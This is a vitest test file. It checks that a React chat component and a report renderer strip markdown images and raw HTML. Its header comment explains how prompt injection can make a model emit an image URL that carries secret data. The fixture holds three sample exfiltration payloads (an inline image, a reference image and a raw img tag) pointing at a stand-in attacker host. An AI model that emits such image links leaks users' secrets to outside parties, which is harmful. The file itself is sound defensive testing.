import React from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { AssistantTurn } from '@/components/maxx/MaxxChat'
import { ReportNarrative } from '@/components/report/ReportNarrative'

/**
 * Model output is untrusted: a prompt-injected feed can make the model emit an image whose URL carries
 * data (`![](https://attacker/?d=secret)`). Rendering it as <img> makes the owner's browser send that
 * request with no click. Both markdown surfaces must drop images entirely and keep raw HTML disabled,
 * while ordinary safe links keep working.
 */
const ATTACKER = 'attacker.example'
const HOSTILE_MARKDOWN = [
  'Spend is steady.',
  '',
  `![chart](https://${ATTACKER}/collect?d=owner-secret)`,
  '',
  `![ref image][r]`,
  '',
  `[r]: https://${ATTACKER}/ref?d=owner-secret`,
  '',
  `<img src="https://${ATTACKER}/raw?d=owner-secret">`,
  '',
  'Read the [Meta guide](https://www.facebook.com/business/help) for details.',
].join('\n')

function expectNoImageAndSafeLink(html: string) {
  expect(html).not.toMatch(/<img/i)
  expect(html).not.toContain(ATTACKER)
  // Control: the surrounding prose and a normal https link still render.
  expect(html).toContain('Spend is steady.')
  expect(html).toContain('href="https://www.facebook.com/business/help"')
  expect(html).toContain('Meta guide</a>')
}

describe('markdown renderers drop images and raw HTML', () => {
  it('Maxx chat assistant turn renders no image and no attacker URL', () => {
    const html = renderToStaticMarkup(<AssistantTurn turn={{ role: 'assistant', content: HOSTILE_MARKDOWN }} />)
    expectNoImageAndSafeLink(html)
  })

  it('report narrative renders no image and no attacker URL', () => {
    const html = renderToStaticMarkup(<ReportNarrative md={`## Summary\n${HOSTILE_MARKDOWN}`} />)
    expectNoImageAndSafeLink(html)
  })
})
